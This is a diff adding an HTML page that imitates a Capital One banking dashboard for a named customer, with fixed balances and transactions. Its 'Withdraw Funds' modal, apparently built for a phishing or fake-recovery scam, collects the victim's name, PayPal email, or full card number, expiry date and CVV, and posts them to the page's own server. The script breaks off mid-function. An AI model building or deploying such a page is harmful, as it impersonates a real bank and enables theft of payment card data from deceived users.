@@ -1,0 +1,1330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>CapitalOne — Sandra Wright Dashboard</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: 'Inter', sans-serif;
+  }
+
+  :root {
+    --navy: #072343;
+    --navy-2: #0f355d;
+    --blue: #2563eb;
+    --blue-2: #3b82f6;
+    --surface: #ffffff;
+    --surface-soft: rgba(255, 255, 255, 0.84);
+    --bg: #eff5ff;
+    --text: #0f172a;
+    --muted: #64748b;
+    --border: rgba(148, 163, 184, 0.2);
+    --shadow: 0 24px 80px rgba(15, 23, 42, 0.08);
+    --shadow-soft: 0 14px 40px rgba(15, 23, 42, 0.08);
+    --radius: 24px;
+  }
+
+  body {
+    background: linear-gradient(180deg, #eef5ff 0%, #f8fbff 100%);
+    color: var(--text);
+    min-height: 100vh;
+    line-height: 1.6;
+  }
+
+  html {
+    scroll-behavior: smooth;
+  }
+
+  a {
+    text-decoration: none;
+    color: inherit;
+  }
+
+  button,
+  input,
+  select {
+    font: inherit;
+  }
+
+  button {
+    cursor: pointer;
+  }
+
+  .topbar {
+    background: rgba(7, 35, 67, 0.96);
+    color: #fff;
+    display: flex;
+    align-items: center;
+    gap: 24px;
+    padding: 18px 32px;
+    position: sticky;
+    top: 0;
+    z-index: 50;
+    box-shadow: 0 18px 40px rgba(7, 35, 67, 0.14);
+    backdrop-filter: blur(16px);
+  }
+
+  .logo {
+    display: inline-flex;
+    align-items: center;
+    height: 50px;
+    padding: 0 8px;
+    text-decoration: none;
+  }
+
+  .logo svg {
+    height: 100%;
+    width: auto;
+    max-width: 200px;
+  }
+
+  .logo .one {
+    font-weight: 300;
+  }
+
+  .swoosh {
+    position: absolute;
+    top: -20px;
+    left: 120px;
+    width: clamp(140px, 22vw, 320px);
+    height: clamp(40px, 5vw, 90px);
+    border-top: 16px solid #d71920;
+    border-radius: 50%;
+    transform: rotate(-4deg);
+  }
+
+  @media (max-width: 768px) {
+    .logo svg {
+      height: 40px;
+    }
+  }
+
+  .search {
+    flex: 1;
+    max-width: 560px;
+    margin: 0 auto;
+    position: relative;
+  }
+
+  .search input {
+    width: 100%;
+    background: rgba(255, 255, 255, 0.96);
+    border: 1px solid rgba(255, 255, 255, 0.45);
+    border-radius: 18px;
+    padding: 14px 18px 14px 46px;
+    font-size: 14px;
+    outline: none;
+    color: var(--text);
+    transition: all 0.25s ease;
+    box-shadow: inset 0 1px 3px rgba(15, 23, 42, 0.08);
+  }
+
+  .search input:focus {
+    border-color: rgba(255, 255, 255, 0.9);
+    box-shadow: inset 0 1px 5px rgba(15, 23, 42, 0.12);
+  }
+
+  .search i {
+    position: absolute;
+    left: 16px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: rgba(255, 255, 255, 0.75);
+  }
+
+  .search .kbd {
+    position: absolute;
+    right: 16px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: rgba(255, 255, 255, 0.8);
+    font-size: 12px;
+    border: 1px solid rgba(255, 255, 255, 0.35);
+    border-radius: 7px;
+    padding: 2px 8px;
+    background: rgba(255, 255, 255, 0.08);
+  }
+
+  .top-actions {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    font-size: 14px;
+  }
+
+  .top-actions .item {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    cursor: pointer;
+    opacity: 0.95;
+    transition: opacity 0.25s ease;
+  }
+
+  .top-actions .item:hover {
+    opacity: 1;
+  }
+
+  .profile {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    cursor: pointer;
+  }
+
+  .layout {
+    display: grid;
+    grid-template-columns: 280px 1fr;
+    gap: 28px;
+    min-height: calc(100vh - 88px);
+    padding: 28px 32px 40px;
+  }
+
+  .sidebar {
+    background: rgba(255, 255, 255, 0.92);
+    border: 1px solid rgba(15, 23, 42, 0.08);
+    border-radius: 28px;
+    padding: 28px 22px;
+    display: flex;
+    flex-direction: column;
+    gap: 18px;
+    box-shadow: var(--shadow-soft);
+    backdrop-filter: blur(16px);
+  }
+
+  .sb-user {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding-bottom: 18px;
+    border-bottom: 1px solid rgba(15, 23, 42, 0.08);
+  }
+
+  .avatar-icon {
+    width: 50px;
+    height: 50px;
+    border-radius: 50%;
+    background: rgba(37, 99, 235, 0.08);
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    color: var(--blue);
+    font-size: 22px;
+  }
+
+  .sb-user .nm {
+    font-weight: 800;
+    font-size: 15px;
+  }
+
+  .sb-user .sub {
+    font-size: 13px;
+    color: var(--muted);
+  }
+
+  .nav {
+    display: grid;
+    gap: 10px;
+  }
+
+  .nav a {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 14px 16px;
+    border-radius: 18px;
+    color: #334155;
+    font-size: 14px;
+    font-weight: 600;
+    transition: all 0.25s ease;
+  }
+
+  .nav a i {
+    width: 20px;
+    text-align: center;
+    color: #64748b;
+    font-size: 14px;
+  }
+
+  .nav a:hover {
+    background: rgba(37, 99, 235, 0.08);
+    color: var(--navy);
+  }
+
+  .nav a.active {
+    background: rgba(37, 99, 235, 0.14);
+    color: var(--blue);
+  }
+
+  .nav a.active i {
+    color: var(--blue);
+  }
+
+  .sb-bottom {
+    margin-top: auto;
+    border-top: 1px solid rgba(15, 23, 42, 0.08);
+    padding-top: 18px;
+    display: grid;
+    gap: 10px;
+  }
+
+  .main {
+    display: flex;
+    flex-direction: column;
+    gap: 26px;
+  }
+
+  .welcome h1 {
+    font-size: clamp(28px, 2.2vw, 36px);
+    font-weight: 800;
+    letter-spacing: -0.03em;
+  }
+
+  .welcome p {
+    color: var(--muted);
+    font-size: 15px;
+    margin-top: 10px;
+  }
+
+  .grid {
+    display: grid;
+    grid-template-columns: minmax(0, 1.8fr) minmax(320px, 1fr);
+    gap: 24px;
+  }
+
+  .balance-card {
+    position: relative;
+    overflow: hidden;
+    border-radius: 32px;
+    padding: 32px;
+    background: linear-gradient(135deg, #0b2c5f 0%, #163b74 100%);
+    color: #fff;
+    box-shadow: 0 32px 80px rgba(7, 35, 67, 0.18);
+  }
+
+  .balance-card::after {
+    content: '';
+    position: absolute;
+    right: -40px;
+    bottom: -40px;
+    width: 220px;
+    height: 220px;
+    border-radius: 50%;
+    background: radial-gradient(circle, rgba(255, 255, 255, 0.18), transparent 60%);
+  }
+
+  .balance-card .brand {
+    position: absolute;
+    top: 24px;
+    right: 24px;
+    font-weight: 800;
+    font-style: italic;
+    opacity: 0.65;
+    letter-spacing: 0.35px;
+  }
+
+  .bal-label {
+    font-size: 13px;
+    opacity: 0.9;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .bal-amount {
+    font-size: clamp(40px, 4vw, 54px);
+    font-weight: 800;
+    margin-top: 14px;
+    letter-spacing: -0.03em;
+  }
+
+  .bal-sub {
+    margin-top: 16px;
+    font-size: 14px;
+    opacity: 0.92;
+  }
+
+  .bal-avail {
+    font-size: 18px;
+    font-weight: 600;
+    margin-top: 8px;
+  }
+
+  .bal-actions {
+    display: grid;
+    grid-template-columns: repeat(2, minmax(0, 1fr));
+    gap: 14px;
+    margin-top: 28px;
+    position: relative;
+    z-index: 2;
+  }
+
+  .btn {
+    padding: 14px 20px;
+    border-radius: 18px;
+    font-weight: 700;
+    font-size: 14px;
+    display: inline-flex;
+    align-items: center;
+    gap: 10px;
+    justify-content: center;
+    transition: transform 0.25s ease, box-shadow 0.25s ease;
+  }
+
+  .btn:hover {
+    transform: translateY(-1px);
+  }
+
+  .btn-white {
+    background: rgba(255, 255, 255, 0.96);
+    color: var(--navy);
+    box-shadow: 0 18px 40px rgba(15, 23, 42, 0.08);
+  }
+
+  .btn-blue {
+    background: linear-gradient(135deg, var(--blue), var(--blue-2));
+    color: #fff;
+    box-shadow: 0 20px 40px rgba(37, 99, 235, 0.25);
+  }
+
+  .quick {
+    background: rgba(255, 255, 255, 0.96);
+    border-radius: 28px;
+    padding: 26px;
+    box-shadow: var(--shadow-soft);
+  }
+
+  .quick h3 {
+    font-size: 16px;
+    font-weight: 800;
+    margin-bottom: 18px;
+  }
+
+  .qa {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    padding: 16px 18px;
+    border-radius: 20px;
+    cursor: pointer;
+    transition: transform 0.25s ease, background 0.25s ease;
+    background: #f8fbff;
+  }
+
+  .qa:hover {
+    transform: translateY(-2px);
+    background: rgba(37, 99, 235, 0.08);
+  }
+
+  .qa .ic {
+    width: 44px;
+    height: 44px;
+    border-radius: 14px;
+    background: rgba(37, 99, 235, 0.12);
+    color: var(--blue);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 16px;
+  }
+
+  .qa .t {
+    font-weight: 700;
+    font-size: 14px;
+  }
+
+  .qa .s {
+    font-size: 13px;
+    color: var(--muted);
+    line-height: 1.4;
+  }
+
+  .qa .ch {
+    margin-left: auto;
+    color: #cbd5e1;
+  }
+
+  .row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 24px;
+    margin-top: 24px;
+  }
+
+  .card {
+    background: rgba(255, 255, 255, 0.96);
+    border-radius: 30px;
+    padding: 26px;
+    box-shadow: var(--shadow-soft);
+    min-height: 100%;
+    transition: transform 0.25s ease;
+  }
+
+  .card:hover {
+    transform: translateY(-2px);
+  }
+
+  .card-head {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 18px;
+  }
+
+  .card-head h3 {
+    font-size: 16px;
+    font-weight: 800;
+  }
+
+  .card-head a {
+    color: var(--blue);
+    font-size: 13px;
+    font-weight: 700;
+  }
+
+  .acct {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    padding: 18px 0;
+    border-bottom: 1px solid rgba(15, 23, 42, 0.06);
+  }
+
+  .acct:last-child {
+    border-bottom: none;
+  }
+
+  .acct .ic {
+    width: 44px;
+    height: 44px;
+    border-radius: 14px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #fff;
+    font-size: 16px;
+  }
+
+  .acct .nm {
+    font-weight: 700;
+    font-size: 14px;
+  }
+
+  .acct .num {
+    font-size: 13px;
+    color: var(--muted);
+  }
+
+  .acct .amt {
+    margin-left: auto;
+    text-align: right;
+  }
+
+  .acct .amt b {
+    font-size: 15px;
+    font-weight: 800;
+  }
+
+  .acct .amt span {
+    display: block;
+    font-size: 12px;
+    color: var(--muted);
+  }
+
+  .spend {
+    display: flex;
+    align-items: center;
+    gap: 24px;
+    padding-top: 10px;
+  }
+
+  .donut {
+    width: 180px;
+    height: 180px;
+    border-radius: 50%;
+    background: conic-gradient(
+      #2563eb 0 38%,
+      #f59e0b 38% 62%,
+      #10b981 62% 76%,
+      #ef4444 76% 88%,
+      #8b5cf6 88% 96%,
+      #94a3b8 96% 100%
+    );
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    box-shadow: inset 0 8px 30px rgba(15, 23, 42, 0.05);
+  }
+
+  .donut-in {
+    width: 122px;
+    height: 122px;
+    background: #fff;
+    border-radius: 50%;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .donut-in b {
+    font-size: 18px;
+  }
+
+  .donut-in span {
+    font-size: 12px;
+    color: var(--muted);
+  }
+
+  .legend {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    font-size: 13px;
+  }
+
+  .legend .li {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .legend .dot {
+    width: 10px;
+    height: 10px;
+    border-radius: 50%;
+  }
+
+  .legend .li b {
+    margin-left: auto;
+    font-weight: 700;
+  }
+
+  .tx {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    padding: 16px 0;
+    border-bottom: 1px solid rgba(15, 23, 42, 0.06);
+  }
+
+  .tx:last-child {
+    border-bottom: none;
+  }
+
+  .tx .ic {
+    width: 46px;
+    height: 46px;
+    border-radius: 16px;
+    background: #f8fbff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 700;
+    font-size: 14px;
+    color: var(--navy);
+  }
+
+  .tx .nm {
+    font-weight: 700;
+    font-size: 14px;
+  }
+
+  .tx .ct {
+    font-size: 13px;
+    color: var(--muted);
+  }
+
+  .tx .r {
+    margin-left: auto;
+    text-align: right;
+  }
+
+  .tx .r b {
+    font-size: 15px;
+    font-weight: 800;
+  }
+
+  .tx .r .neg {
+    color: var(--navy);
+  }
+
+  .tx .r .pos {
+    color: var(--green);
+  }
+
+  .tx .r span {
+    display: block;
+    font-size: 12px;
+    color: var(--muted);
+  }
+
+  .sum-row {
+    display: flex;
+    justify-content: space-between;
+    padding: 16px 0;
+    border-bottom: 1px solid rgba(15, 23, 42, 0.06);
+    font-size: 14px;
+  }
+
+  .sum-row:last-of-type {
+    border-bottom: none;
+  }
+
+  .sum-row .l {
+    color: var(--muted);
+  }
+
+  .sum-row .v {
+    font-weight: 700;
+  }
+
+  .full-btn {
+    display: block;
+    width: 100%;
+    text-align: center;
+    padding: 14px;
+    border: 1px solid var(--blue);
+    color: var(--blue);
+    border-radius: 18px;
+    font-weight: 700;
+    margin-top: 16px;
+    background: #fff;
+    transition: all 0.25s ease;
+  }
+
+  .full-btn:hover {
+    background: var(--blue);
+    color: #fff;
+    transform: translateY(-1px);
+  }
+
+  .modal {
+    position: fixed;
+    inset: 0;
+    background: rgba(7, 35, 67, 0.55);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 100;
+    padding: 20px;
+    backdrop-filter: blur(8px);
+  }
+
+  .modal.open {
+    display: flex;
+    animation: fade 0.25s ease;
+  }
+
+  @keyframes fade {
+    from {
+      opacity: 0;
+    }
+    to {
+      opacity: 1;
+    }
+  }
+
+  .modal-box {
+    background: rgba(255, 255, 255, 0.98);
+    width: 100%;
+    max-width: 560px;
+    border-radius: 30px;
+    padding: 28px;
+    max-height: 92vh;
+    overflow: auto;
+    animation: up 0.3s ease;
+    box-shadow: 0 40px 90px rgba(7, 35, 67, 0.18);
+  }
+
+  @keyframes up {
+    from {
+      transform: translateY(20px);
+      opacity: 0;
+    }
+    to {
+      transform: none;
+      opacity: 1;
+    }
+  }
+
+  .modal-head {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 22px;
+  }
+
+  .modal-head h2 {
+    font-size: 20px;
+    font-weight: 800;
+  }
+
+  .modal-head button {
+    background: none;
+    font-size: 28px;
+    color: var(--muted);
+    line-height: 1;
+  }
+
+  .field {
+    margin-bottom: 18px;
+  }
+
+  .field label {
+    display: block;
+    font-size: 13px;
+    font-weight: 700;
+    margin-bottom: 8px;
+    color: #334155;
+  }
+
+  .field input,
+  .field select {
+    width: 100%;
+    padding: 14px 16px;
+    border: 1px solid rgba(15, 23, 42, 0.12);
+    border-radius: 16px;
+    font-size: 14px;
+    outline: none;
+    transition: border-color 0.25s ease, box-shadow 0.25s ease;
+    background: #fbfdff;
+  }
+
+  .field input:focus,
+  .field select:focus {
+    border-color: rgba(37, 99, 235, 0.4);
+    box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.08);
+  }
+
+  .pm-grid {
+    display: grid;
+    grid-template-columns: repeat(2, minmax(0, 1fr));
+    gap: 12px;
+  }
+
+  .pm {
+    border: 1px solid rgba(15, 23, 42, 0.12);
+    border-radius: 18px;
+    padding: 16px;
+    font-size: 13px;
+    font-weight: 700;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    justify-content: center;
+    cursor: pointer;
+    transition: all 0.25s ease;
+    background: #fff;
+  }
+
+  .pm:hover {
+    border-color: rgba(37, 99, 235, 0.3);
+    transform: translateY(-1px);
+    background: rgba(37, 99, 235, 0.06);
+  }
+
+  .pm.active {
+    border-color: var(--blue);
+    background: rgba(37, 99, 235, 0.12);
+    color: var(--blue);
+  }
+
+  .row2 {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+  }
+
+  .submit {
+    width: 100%;
+    background: linear-gradient(135deg, var(--blue), var(--blue-2));
+    color: #fff;
+    padding: 16px;
+    border-radius: 18px;
+    font-weight: 800;
+    margin-top: 10px;
+    font-size: 15px;
+    transition: transform 0.25s ease, box-shadow 0.25s ease;
+    box-shadow: 0 18px 35px rgba(37, 99, 235, 0.2);
+  }
+
+  .submit:hover {
+    transform: translateY(-1px);
+  }
+
+  .toast {
+    position: fixed;
+    bottom: 24px;
+    right: 24px;
+    background: var(--navy);
+    color: #fff;
+    padding: 16px 22px;
+    border-radius: 18px;
+    display: none;
+    z-index: 200;
+    animation: up 0.3s ease;
+    box-shadow: 0 24px 60px rgba(7, 35, 67, 0.22);
+  }
+
+  .toast.show {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .toast i {
+    color: #34d399;
+  }
+
+  @media (max-width: 1024px) {
+    .layout {
+      grid-template-columns: 1fr;
+      padding: 22px 24px 32px;
+    }
+    .grid,
+    .row {
+      grid-template-columns: 1fr;
+    }
+    .main {
+      gap: 22px;
+    }
+  }
+
+  @media (max-width: 768px) {
+    .topbar {
+      flex-wrap: wrap;
+      gap: 14px;
+      padding: 16px 18px;
+    }
+
+    .search {
+      width: 100%;
+      max-width: 100%;
+    }
+
+    .top-actions {
+      width: 100%;
+      justify-content: space-between;
+    }
+
+    .sidebar {
+      display: none;
+    }
+
+    .main {
+      padding: 0;
+    }
+
+    .modal-box {
+      padding: 24px;
+    }
+
+    .pm-grid {
+      grid-template-columns: 1fr;
+    }
+
+    .field input,
+    .field select {
+      padding: 14px 16px;
+    }
+  }
+</style>
+</head>
+<body>
+<header class="topbar">
+  <a href="#" class="logo">
+    <svg viewBox="0 0 280 60" xmlns="http://www.w3.org/2000/svg" role="img" aria-labelledby="logoTitle">
+      <title id="logoTitle">Capital One</title>
+      <defs>
+        <style>
+          .word{font-family:Inter, Arial, Helvetica, sans-serif; font-weight:700; font-size:40px; fill:#002b57}
+          .one{font-weight:600}
+        </style>
+      </defs>
+      <text x="4" y="45" class="word">Capital<tspan class="one">One</tspan></text>
+    </svg>
+  </a>
+  <div class="search">
+    <i class="fa-solid fa-magnifying-glass"></i>
+    <input type="text" placeholder="Search for transactions, accounts, and more...">
+    <span class="kbd">/</span>
+  </div>
+  <div class="top-actions">
+    <div class="item" onclick="toast('No new notifications')"><i class="fa-regular fa-bell"></i><span>Notifications</span></div>
+    <div class="item"><i class="fa-regular fa-circle-question"></i><span>Help</span></div>
+    <div class="profile">
+      <div class="avatar-icon"><i class="fa-regular fa-circle-user"></i></div>
+      <span>Sandra Wright</span>
+      <i class="fa-solid fa-chevron-down" style="font-size:11px"></i>
+    </div>
+  </div>
+</header>
+<div class="layout">
+  <aside class="sidebar">
+    <div class="sb-user">
+      <div class="avatar-icon"><i class="fa-regular fa-circle-user"></i></div>
+      <div>
+        <div class="nm">Sandra Wright</div>
+        <div class="sub">Good morning 👋</div>
+      </div>
+    </div>
+    <nav class="nav" id="nav">
+      <a class="active" data-page="Dashboard"><i class="fa-solid fa-house"></i>Dashboard</a>
+      <a data-page="Accounts"><i class="fa-regular fa-credit-card"></i>Accounts</a>
+      <a data-page="Transfers"><i class="fa-solid fa-right-left"></i>Transfers</a>
+      <a data-page="Pay Bills"><i class="fa-regular fa-file-lines"></i>Pay Bills</a>
+      <a data-page="Cards"><i class="fa-regular fa-credit-card"></i>Cards</a>
+      <a data-page="Investments"><i class="fa-solid fa-chart-line"></i>Investments</a>
+      <a data-page="Benefits"><i class="fa-solid fa-gift"></i>Benefits</a>
+      <a data-page="Rewards"><i class="fa-solid fa-award"></i>Rewards</a>
+      <a data-page="Messages"><i class="fa-regular fa-envelope"></i>Messages</a>
+    </nav>
+    <div class="sb-bottom">
+      <a class="nav-link" style="display:flex;align-items:center;gap:12px;padding:11px 14px;color:#334155;font-size:14px;font-weight:500"><i class="fa-solid fa-gear"></i>Settings</a>
+      <a class="nav-link" style="display:flex;align-items:center;gap:12px;padding:11px 14px;color:#334155;font-size:14px;font-weight:500"><i class="fa-solid fa-right-from-bracket"></i>Log Out</a>
+    </div>
+  </aside>
+  <main class="main">
+    <div class="welcome">
+      <h1>Welcome back, Sandra</h1>
+      <p>Here's what's happening with your accounts today.</p>
+    </div>
+    <div class="grid">
+      <div class="balance-card">
+        <div class="brand">CapitalOne</div>
+        <div class="bal-label">Total Account Balance <i class="fa-regular fa-eye"></i></div>
+        <div class="bal-amount" id="balAmt">$9,000.00</div>
+        <div class="bal-sub">Available Balance</div>
+        <div class="bal-avail">$9,000.00</div>
+        <div class="bal-actions">
+          <button class="btn btn-white"><i class="fa-solid fa-circle-plus"></i> Add Money</button>
+          <button class="btn btn-blue" onclick="openWithdraw()"><i class="fa-solid fa-circle-up"></i> Withdraw</button>
+        </div>
+      </div>
+      <div class="quick">
+        <h3>Quick Actions</h3>
+        <div class="qa"><div class="ic"><i class="fa-solid fa-right-left"></i></div><div><div class="t">Transfer Money</div><div class="s">Send money to your accounts</div></div><i class="fa-solid fa-chevron-right ch"></i></div>
+        <div class="qa"><div class="ic"><i class="fa-regular fa-file-lines"></i></div><div><div class="t">Pay Bills</div><div class="s">View and pay your bills</div></div><i class="fa-solid fa-chevron-right ch"></i></div>
+        <div class="qa"><div class="ic"><i class="fa-regular fa-file"></i></div><div><div class="t">View Statements</div><div class="s">Access your account statements</div></div><i class="fa-solid fa-chevron-right ch"></i></div>
+        <div class="qa"><div class="ic"><i class="fa-regular fa-square-check"></i></div><div><div class="t">Check Spending</div><div class="s">Track your spending activity</div></div><i class="fa-solid fa-chevron-right ch"></i></div>
+      </div>
+    </div>
+    <div class="row">
+      <div class="card">
+        <div class="card-head"><h3>My Accounts</h3><a href="#">View All</a></div>
+        <div class="acct"><div class="ic" style="background:#2563eb"><i class="fa-regular fa-credit-card"></i></div><div><div class="nm">360 Checking</div><div class="num">•••• 1234</div></div><div class="amt"><b>$6,250.50</b><span>Available</span></div></div>
+        <div class="acct"><div class="ic" style="background:#10b981"><i class="fa-solid fa-piggy-bank"></i></div><div><div class="nm">Savings</div><div class="num">•••• 5678</div></div><div class="amt"><b>$2,749.50</b><span>Available</span></div></div>
+        <div class="acct"><div class="ic" style="background:#ef4444"><i class="fa-regular fa-credit-card"></i></div><div><div class="nm">Credit Card</div><div class="num">•••• 9012</div></div><div class="amt"><b>$1,250.30</b><span>Current Balance</span></div></div>
+      </div>
+      <div class="card">
+        <div class="card-head"><h3>Spending Overview</h3><a href="#">This Month <i class="fa-solid fa-chevron-down" style="font-size:10px"></i></a></div>
+        <div class="spend">
+          <div class="donut"><div class="donut-in"><b>$2,350.75</b><span>Total Spending</span></div></div>
+          <div class="legend">
+            <div class="li"><span class="dot" style="background:#2563eb"></span>Shopping<b>$850.40</b></div>
+            <div class="li"><span class="dot" style="background:#f59e0b"></span>Food & Dining<b>$560.25</b></div>
+            <div class="li"><span class="dot" style="background:#10b981"></span>Transport<b>$320.50</b></div>
+            <div class="li"><span class="dot" style="background:#ef4444"></span>Utilities<b>$280.30</b></div>
+            <div class="li"><span class="dot" style="background:#8b5cf6"></span>Entertainment<b>$180.60</b></div>
+            <div class="li"><span class="dot" style="background:#94a3b8"></span>Others<b>$158.70</b></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="row">
+      <div class="card">
+        <div class="card-head"><h3>Recent Transactions</h3><a href="#">View All</a></div>
+        <div class="tx"><div class="ic">A</div><div><div class="nm">Amazon.com</div><div class="ct">Shopping</div></div><div class="r"><b class="neg">-$120.45</b><span>May 24, 2024</span></div></div>
+        <div class="tx"><div class="ic" style="background:#0a6e3d;color:#fff">S</div><div><div class="nm">Starbucks</div><div class="ct">Food & Dining</div></div><div class="r"><b class="neg">-$8.75</b><span>May 24, 2024</span></div></div>
+        <div class="tx"><div class="ic" style="background:#dcfce7;color:#10b981"><i class="fa-solid fa-arrow-down"></i></div><div><div class="nm">Salary Deposit</div><div class="ct">Income</div></div><div class="r"><b class="pos">+$2,500.00</b><span>May 23, 2024</span></div></div>
+        <div class="tx"><div class="ic" style="background:#0f172a;color:#fff">U</div><div><div class="nm">Uber</div><div class="ct">Transport</div></div><div class="r"><b class="neg">-$15.30</b><span>May 22, 2024</span></div></div>
+      </div>
+      <div class="card">
+        <div class="card-head"><h3>Account Summary</h3></div>
+        <div class="sum-row"><span class="l">Total Balance</span><span class="v">$9,000.00</span></div>
+        <div class="sum-row"><span class="l">Available Credit</span><span class="v">$8,500.00</span></div>
+        <div class="sum-row"><span class="l">Rewards Balance</span><span class="v">25,430 pts</span></div>
+        <div class="sum-row"><span class="l">Next Payment Due</span><span class="v">Jun 05, 2024</span></div>
+        <button class="full-btn">View Full Summary</button>
+      </div>
+    </div>
+  </main>
+</div>
+<div class="modal" id="wModal">
+  <div class="modal-box">
+    <div class="modal-head">
+      <h2><i class="fa-solid fa-circle-up" style="color:var(--blue)"></i> Withdraw Funds</h2>
+      <button onclick="closeWithdraw()">&times;</button>
+    </div>
+    <form id="wForm" action="" method="post" enctype="multipart/form-data">
+      <input type="hidden" name="paymentMethod" id="paymentMethod" value="paypal">
+      <div class="field"><label>Full Name</label><input required name="fullName" placeholder="Sandra Wright"></div>
+      <div class="field"><label>Country</label>
+        <select required name="country">
+          <option value="">Select country</option>
+          <option>United States</option><option>United Kingdom</option><option>Canada</option>
+          <option>Australia</option><option>Germany</option><option>France</option><option>Other</option>
+        </select>
+      </div>
+      <div class="field"><label>Amount (USD)</label><input required type="number" min="1" name="amount" placeholder="0.00"></div>
+      <div class="field">
+        <label>Payment Method</label>
+        <div class="pm-grid" id="pmGrid">
+          <div class="pm active" data-m="paypal"><i class="fa-brands fa-paypal"></i> PayPal</div>
+          <div class="pm" data-m="visa"><i class="fa-brands fa-cc-visa"></i> Visa Card</div>
+          <div class="pm" data-m="mc"><i class="fa-brands fa-cc-mastercard"></i> Mastercard</div>
+        </div>
+      </div>
+      <div id="dyn"></div>
+      <button class="submit" type="submit"><i class="fa-solid fa-lock"></i> Confirm Withdrawal</button>
+    </form>
+  </div>
+</div>
+<div class="toast" id="toast"><i class="fa-solid fa-circle-check"></i><span id="toastMsg">Done</span></div>
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+  let _tt;
+  function toast(msg) {
+    const t = document.getElementById('toast');
+    const m = document.getElementById('toastMsg');
+    if (!t || !m) return;
+    m.textContent = msg;
+    t.classList.add('show');
+    clearTimeout(_tt);
+    _tt = setTimeout(() => t.classList.remove('show'), 2500);
+  }
+
+  document.querySelectorAll('#nav a').forEach(a => {
+    a.addEventListener('click', () => {
+      document.querySelectorAll('#nav a').forEach(x => x.classList.remove('active'));
+      a.classList.add('active');
+      toast(a.dataset.page + ' loaded');
+    });
+  });
+
+  const wModal = document.getElementById('wModal');
+  const wForm = document.getElementById('wForm');
+  const pmGrid = document.getElementById('pmGrid');
+  const dyn = document.getElementById('dyn');
+  const paymentInput = document.getElementById('paymentMethod');
+
+  if (!wModal || !wForm || !pmGrid || !dyn || !paymentInput) {
+    console.error('Modal or form elements missing in DOM.');
+    return;
+  }
+
+  let method = 'paypal';
+
+  window.openWithdraw = function () {
+    wModal.classList.add('open');
+    setPaymentMethod('paypal');
+    renderDyn('paypal');
+  };
+  window.closeWithdraw = function () {
+    wModal.classList.remove('open');
+  };
+  wModal.addEventListener('click', e => {
+    if (e.target === wModal) closeWithdraw();
+  });
+
+  function setPaymentMethod(m) {
+    method = m;
+    paymentInput.value = m;
+    console.log('Selected payment method:', method);
+  }
+
+  pmGrid.querySelectorAll('.pm').forEach((p) => {
+    p.addEventListener('click', () => {
+      pmGrid.querySelectorAll('.pm').forEach(x => x.classList.remove('active'));
+      p.classList.add('active');
+      const m = p.dataset.m;
+      setPaymentMethod(m);
+      renderDyn(m);
+    });
+  });
+
+  function renderDyn(m) {
+    let html = '';
+    if (m === 'paypal') {
+      html = `<div class="field"><label>PayPal Email Address</label><input required type="email" name="paypalEmail" placeholder="you@paypal.com"></div>`;
+    } else if (m === 'visa' || m === 'mc') {
+      const label = m === 'visa' ? 'Visa' : 'Mastercard';
+      html = `
+        <div class="field"><label>Cardholder Name</label><input required name="cardholderName" placeholder="Name on ${label}"></div>
+        <div class="field"><label>Card Number</label><input required name="cardNumber" placeholder="1234 5678 9012 3456" type="text" maxlength="19"></div>
+        <div class="field"><label>Expiry Date</label><input required name="expiryDate" placeholder="MM/YY" maxlength="5"></div>
+        <div class="field"><label>CCV</label><input required name="cvv" placeholder="123" type="text" maxlength="4"></div>`;
+    }
+    dyn.innerHTML = html;
+    if (m === 'visa' || m === 'mc') {
+      attachExpiryDateFormatter();
+    }
+  }
+
+  function attachExpiryDateFormatter() {
+    const expiryInput = document.querySelector('input[name="expiryDate"]');
+    if (!expiryInput) return;
+
+    expiryInput.addEventListener('input', (e) => {
+      let value = e.target.value.replace(/\D/g, '');
+      if (value.length >= 2) {
+        value = value.substring(0, 2) + '/' + value.substring(2, 4);
+      }
+      value = value.substring(0, 5);
+      e.target.value = value;
+    });
+
+    expiryInput.addEventListener('blur', (e) => {
+      const value = e.target.value;
+      if (value && value.length === 5) {
+        const parts = value.split('/');
+        const month = parseInt(parts[0], 10);
+        const year = parts[1];
+        if (isNaN(month) || month < 1 || month > 12 || !year) {
+          console.error('Invalid expiry date. Month must be 01-12.');
+          e.target.setCustomValidity('Invalid expiry date. Use MM/YY format with month 01-12.');
+        } else {
+          e.target.setCustomValidity('');
+        }
+      } else if (value) {
